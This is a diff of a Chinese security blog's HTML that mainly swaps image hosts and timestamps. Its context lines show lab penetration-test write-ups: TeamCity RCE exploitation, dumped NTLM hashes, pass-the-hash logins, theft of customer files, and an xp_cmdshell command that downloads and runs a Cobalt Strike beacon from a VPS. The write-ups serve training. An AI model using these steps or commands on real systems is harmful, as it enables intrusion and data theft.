@@ -193,9 +193,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2024-10-28 08:54:42 / 修改时间：17:36:31" itemprop="dateCreated datePublished" datetime="2024-10-28T08:54:42+08:00">2024-10-28</time>
+      <time title="创建时间：2024-10-28 08:54:42" itemprop="dateCreated datePublished" datetime="2024-10-28T08:54:42+08:00">2024-10-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-11-01 11:10:15" itemprop="dateModified" datetime="2024-11-01T11:10:15+08:00">2024-11-01</time>
     </span>
 
   
@@ -227,33 +233,33 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">👉 root@racknerd-cfd9bbe ~ git:() docker run -it --<span class="built_in">rm</span> --name rustscan rustscan/rustscan:2.1.1 -u 70000 -a 50.185.68.69 -- -sC -Pn</span><br><span class="line">.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.</span><br><span class="line">| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| |</span><br><span class="line">| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |</span><br><span class="line">`-<span class="string">&#x27; `-&#x27;</span>`-----<span class="string">&#x27;`----&#x27;</span>  `-<span class="string">&#x27;  `----&#x27;</span>  `---<span class="string">&#x27; `-&#x27;</span>  `-<span class="string">&#x27;`-&#x27;</span> `-<span class="string">&#x27;</span></span><br><span class="line"><span class="string">The Modern Day Port Scanner.</span></span><br><span class="line"><span class="string">________________________________________</span></span><br><span class="line"><span class="string">: http://discord.skerritt.blog           :</span></span><br><span class="line"><span class="string">: https://github.com/RustScan/RustScan :</span></span><br><span class="line"><span class="string"> --------------------------------------</span></span><br><span class="line"><span class="string">😵 https://admin.tryhackme.com</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[~] The config file is expected to be at &quot;/home/rustscan/.rustscan.toml&quot;</span></span><br><span class="line"><span class="string">[~] Automatically increasing ulimit value to 70000.</span></span><br><span class="line"><span class="string">Open 50.185.68.69:80</span></span><br><span class="line"><span class="string">Open 50.185.68.69:3306</span></span><br><span class="line"><span class="string">Open 50.185.68.69:5672</span></span><br><span class="line"><span class="string">Open 50.185.68.69:8111</span></span><br><span class="line"><span class="string">Open 50.185.68.69:8080</span></span><br><span class="line"><span class="string">Open 50.185.68.69:8081</span></span><br><span class="line"><span class="string">Open 50.185.68.69:8383</span></span><br></pre></td></tr></table></figure>
 
 <p>分别访问并找历史CVE漏洞，最后发现 8111 端口的 TeamCity 可以利用，使用找到的 <a target="_blank" rel="noopener" href="https://github.com/Stuub/RCity-CVE-2024-27198">RCE exp</a> GetShell</p>
-<p><img src="https://raw.githubusercontent.com/Lamber-maybe/blog-img/master/blog-img/202410281705508.jpg" alt="202410281705508"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/Lamber-maybe/blog-img/blog-img/202410281705508.jpg" alt="202410281705508"></p>
 <p>然后上传 C2 beacon 并上线该机器(反弹shell也是可以的，只不过用C2后续操作更加方便)</p>
 <h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><p>用CS上线之后，使用 <code>hashdump</code> 命令 dump 本机的用户hash，拿到以下hash</p>
-<p><img src="https://raw.githubusercontent.com/Lamber-maybe/blog-img/master/blog-img/202410281707695.jpg" alt="202410281707695"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/Lamber-maybe/blog-img/blog-img/202410281707695.jpg" alt="202410281707695"></p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:e20e81c5c06ccf288474c581f13423b9:::</span><br><span class="line">apache:1001:aad3b435b51404eeaad3b435b51404ee:ed813bb7cbb634bdd4b33e0c71d45cea:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">mspadmin:1000:aad3b435b51404eeaad3b435b51404ee:e20e81c5c06ccf288474c581f13423b9:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:42bd78d638a1093d29abbfebda57f139:::</span><br></pre></td></tr></table></figure>
 
 <p>然后上传 <code>SharpHound.exe</code> 进行域信息收集，收集完毕之后在 <code>BloodHound</code> 中查看，发现 <code>mspadmin</code> 用户隶属于域 <code>Administrator</code> 组和 <code>Domain Admins</code> 组（任务：获取DA域管理员权限 - 完成） </p>
-<p><img src="https://raw.githubusercontent.com/Lamber-maybe/blog-img/master/blog-img/202410281711413.jpg" alt="202410281711413"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/Lamber-maybe/blog-img/blog-img/202410281711413.jpg" alt="202410281711413"></p>
 <p>这也就说明我们现在已经拥有了域内管理员权限了。然后上传并使用 <code>fscan.exe</code> 扫描内网资产，目的是定位域控和 <code>FILES001</code> 机器，所以这里使用 <code>-nopoc</code> 参数并指定常见端口进行扫描，命令如下：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 10.2.40.1/16 -nopoc -t 10 -p 88,135,389,445,636,5985</span><br></pre></td></tr></table></figure>
 
 <p>扫描结果如下图：</p>
-<p><img src="https://raw.githubusercontent.com/Lamber-maybe/blog-img/master/blog-img/202410281714679.jpg" alt="202410281714679"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/Lamber-maybe/blog-img/blog-img/202410281714679.jpg" alt="202410281714679"></p>
 <p>开放端口如下：</p>
-<p><img src="https://raw.githubusercontent.com/Lamber-maybe/blog-img/master/blog-img/202410281717357.jpg" alt="202410281717357"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/Lamber-maybe/blog-img/blog-img/202410281717357.jpg" alt="202410281717357"></p>
 <p>然后内网穿透并使用 <code>evil-winrm</code> 以 <code>pth</code> 的方式登上去，成功登录，域管理员账户有效。</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q evil-winrm -i 10.2.40.50 -u mspadmin -H e20e81c5c06ccf288474c581f13423b9</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/Lamber-maybe/blog-img/master/blog-img/202410281718396.jpg" alt="202410281718396"></p>
-<p><img src="https://raw.githubusercontent.com/Lamber-maybe/blog-img/master/blog-img/202410281719090.jpg" alt="202410281719090"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/Lamber-maybe/blog-img/blog-img/202410281718396.jpg" alt="202410281718396"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/Lamber-maybe/blog-img/blog-img/202410281719090.jpg" alt="202410281719090"></p>
 <h2 id="文件服务器"><a href="#文件服务器" class="headerlink" title="文件服务器"></a>文件服务器</h2><p>现在只剩在 <code>FILES001</code> 中寻找敏感信息了。用 <code>smbclient</code> 的 <code>tree</code> 命令可以快速浏览大量文件。最终在E盘中找到大量客户记录(custom records)。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 smbclient.py gapfactories.local/mspadmin@10.2.40.90 --hashes &quot;:e20e81c5c06ccf288474c581f13423b9&quot;</span><br><span class="line"></span><br><span class="line"># shares</span><br><span class="line">ADMIN$</span><br><span class="line">C$</span><br><span class="line">E$</span><br><span class="line">Insurances</span><br><span class="line">IPC$</span><br><span class="line">it</span><br><span class="line"></span><br><span class="line"># use E$</span><br><span class="line"># tree</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/Lamber-maybe/blog-img/master/blog-img/202410281723769.jpg" alt="202410281723769"></p>
-<p><img src="https://raw.githubusercontent.com/Lamber-maybe/blog-img/master/blog-img/202410281723014.jpg" alt="202410281723014"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/Lamber-maybe/blog-img/blog-img/202410281723769.jpg" alt="202410281723769"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/Lamber-maybe/blog-img/blog-img/202410281723014.jpg" alt="202410281723014"></p>
 <p>下载下来进行查看，发现确实是客户的个人信息。（任务：窃取FILE001文件服务器上的用户数据 - 完成）</p>
-<p><img src="https://raw.githubusercontent.com/Lamber-maybe/blog-img/master/blog-img/202410281725843.png" alt="202410281725843"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/Lamber-maybe/blog-img/blog-img/202410281725843.png" alt="202410281725843"></p>
 
       
     </div>
@@ -316,7 +322,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-11-01 10:38:33" itemprop="dateModified" datetime="2024-11-01T10:38:33+08:00">2024-11-01</time>
+      <time title="修改时间：2024-11-01 11:10:17" itemprop="dateModified" datetime="2024-11-01T11:10:17+08:00">2024-11-01</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -427,7 +433,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-10-25 17:26:58" itemprop="dateModified" datetime="2024-10-25T17:26:58+08:00">2024-10-25</time>
+      <time title="修改时间：2024-11-01 11:04:59" itemprop="dateModified" datetime="2024-11-01T11:04:59+08:00">2024-11-01</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -473,7 +479,7 @@
 <li>如果某玩家把 vps 的环境搞崩溃，如果回退环境，也会影响到其它玩家。</li>
 </ol>
 <h2 id="方案二、使用-Chisel-搭建-Socks5隧道，玩家使用-Socks5隧道进行游玩"><a href="#方案二、使用-Chisel-搭建-Socks5隧道，玩家使用-Socks5隧道进行游玩" class="headerlink" title="方案二、使用 Chisel 搭建 Socks5隧道，玩家使用 Socks5隧道进行游玩"></a>方案二、使用 Chisel 搭建 Socks5隧道，玩家使用 Socks5隧道进行游玩</h2><p>在仔细查阅 Chisel 的官方文档之后，实现了一种通过 Chisel 代理实现多人共同游玩的方案：</p>
-<p><img src="https://raw.githubusercontent.com/Lamber-maybe/blog-img/master/blog-img/chisel_collaboration_1.png" alt="chisel_collaboration_1"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/Lamber-maybe/blog-img/blog-img/chisel_collaboration_1.png" alt="chisel_collaboration_1"></p>
 <ol>
 <li>首先，在 vps 上启动openvpn连接靶场节点</li>
 <li>然后，在 vps 上启动 Chisel 服务端</li>
@@ -482,7 +488,7 @@
 <li>这样所有人都可以通过设置本地socks代理，代理地址为 <code>socks5 107.173.157.111 1080</code> 。从而访问到靶场内部</li>
 </ol>
 <p>虽然这种方案解决了多人一起玩的需求，但是前提是得有某一个人拿下入口机的权限，去入口机上架设socks5隧道。那如果想要让大家都真正的从零开始玩呢？比如从扫描靶机网段，探测入口机地址开始。</p>
-<h2 id="方案二点五、改进原-Chisel-搭建方案"><a href="#方案二点五、改进原-Chisel-搭建方案" class="headerlink" title="方案二点五、改进原 Chisel 搭建方案"></a>方案二点五、改进原 Chisel 搭建方案</h2><p><img src="https://raw.githubusercontent.com/Lamber-maybe/blog-img/master/blog-img/chisel_collaboration_2.png" alt="chisel_collaboration_2"></p>
+<h2 id="方案二点五、改进原-Chisel-搭建方案"><a href="#方案二点五、改进原-Chisel-搭建方案" class="headerlink" title="方案二点五、改进原 Chisel 搭建方案"></a>方案二点五、改进原 Chisel 搭建方案</h2><p><img src="https://fastly.jsdelivr.net/gh/Lamber-maybe/blog-img/blog-img/chisel_collaboration_2.png" alt="chisel_collaboration_2"></p>
 <p>经过了一番思考，改进了一下上一版方案：</p>
 <ol>
 <li>在 VPS 上，启动 Chisel 客户端，连接 VPS 上已经启动好的 Chisel 服务端</li>
@@ -499,18 +505,18 @@
 </ol>
 <p>这样所有玩家，直接加入 Zerotire 网络即可访问靶场网段。</p>
 <p>同时，在 VPS上保留了一个 Chisel 服务端。当玩家打完入口机之后，可以使用 scp 将 Chisel 传到入口机上，<br>然后连接 VPS 的 Chisel 服务端启动一条socks5隧道用于后续内网穿透。和 Chisel 方案操作一致。</p>
-<p><img src="https://raw.githubusercontent.com/Lamber-maybe/blog-img/master/blog-img/KALI-to-DANTE-WEB-NIX01-chisel-reverse-socks5.gif" alt="KALI-to-DANTE-WEB-NIX01-chisel-reverse-socks5"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/Lamber-maybe/blog-img/blog-img/KALI-to-DANTE-WEB-NIX01-chisel-reverse-socks5.gif" alt="KALI-to-DANTE-WEB-NIX01-chisel-reverse-socks5"></p>
 <p>使用 Zerotire 方案已经解决了很大一部分的靶场稳定性和速度问题。进一步优化靶场速度，只能从 VPS 的位置考虑。</p>
 <p>Hack The Box的总部位于英国伦敦，选择位于伦敦的 VPS 可以将 VPS 与靶场之间的通信延迟，降低到 10ms。</p>
 <p>这时候再考虑 VPS 与国内之间的通信延迟，尽可能低即可。</p>
 <p>原本为了实现低延迟，考虑选用CN2 GIA线路的 VPS，即从国外到国内走单独的直连线路。延迟最低，价格也最贵。是的，价格太昂贵了，只是为了用来搭建低延迟的多人协作靶场，属实是大材小用了。</p>
 <p>然后，开始横向对比多家云服务器厂商的普通产品。最后选定了 <a target="_blank" rel="noopener" href="https://www.vultr.com/">vultr</a> 家的伦敦节点 VPS，采用最抠门配置，1核1G。<br>每月6美元，并且可以用 paypal 余额支付，非常划算。</p>
 <p>VPS 与 靶场直连的延迟平均为1.5ms：</p>
-<p><img src="https://raw.githubusercontent.com/Lamber-maybe/blog-img/master/blog-img/vps-to-htb.jpg" alt="vps-to-htb"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/Lamber-maybe/blog-img/blog-img/vps-to-htb.jpg" alt="vps-to-htb"></p>
 <p>本地 与 VPS 直连的延迟平均为170ms：</p>
-<p><img src="https://raw.githubusercontent.com/Lamber-maybe/blog-img/master/blog-img/kali-to-vps.jpg" alt="kali-to-vps"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/Lamber-maybe/blog-img/blog-img/kali-to-vps.jpg" alt="kali-to-vps"></p>
 <p>整体使用效果平均为172ms：</p>
-<p><img src="https://raw.githubusercontent.com/Lamber-maybe/blog-img/master/blog-img/kali-to-htb.jpg" alt="kali-to-htb"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/Lamber-maybe/blog-img/blog-img/kali-to-htb.jpg" alt="kali-to-htb"></p>
 <p>这样有个好处，如果还嫌本地和靶场交互操作慢，可以选择接梯子加速连上VPS，从VPS和靶场直接交互，延迟只有不到3ms。</p>
 <h2 id="多人情况下如何反弹shell"><a href="#多人情况下如何反弹shell" class="headerlink" title="多人情况下如何反弹shell?"></a>多人情况下如何反弹shell?</h2><p>由于多人一起打，本质上是通过一个公用vps将所有人的流量集体转发到HTB靶场内部，如下图:</p>
 <pre><code class="highlight mermaid">flowchart LR
@@ -526,7 +532,7 @@
 <p>有，我们可以直接用一种更高级的“反弹shell”手段，即使用C2工具。</p>
 <p>既然能反弹shell，说明一定能执行命令，那么就可以通过执行命令，下载C2工具的beacon然后直接将受害机上线。</p>
 <p>以 CobaltStrike 为例，在 vps 上启动 CobaltStrike 的 teamserver</p>
-<p><img src="https://raw.githubusercontent.com/Lamber-maybe/blog-img/master/blog-img/202410251157628.png" alt="202410251157628"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/Lamber-maybe/blog-img/blog-img/202410251157628.png" alt="202410251157628"></p>
 <p>反弹shell 以 mssql 的 xp_cmdshell 为例，首先生成一个 CS 的 beacon，然后用python启动一个临时的web服务，使用 xp_cmdshell 下载 beacon 并执行</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> xp_cmdshell <span class="string">&#x27;powershell.exe wget http://vps-ip:8000/cs.exe -OutFile C:\\Users\Public\\cs.exe&#x27;</span></span><br><span class="line"><span class="keyword">exec</span> xp_cmdshell <span class="string">&#x27;C:\\Users\Public\\cs.exe&#x27;</span></span><br></pre></td></tr></table></figure>
 
@@ -804,7 +810,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-10-26 17:54:12" itemprop="dateModified" datetime="2024-10-26T17:54:12+08:00">2024-10-26</time>
+      <time title="修改时间：2024-11-01 11:08:52" itemprop="dateModified" datetime="2024-11-01T11:08:52+08:00">2024-11-01</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -827,7 +833,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>865</span>
+      <span>864</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
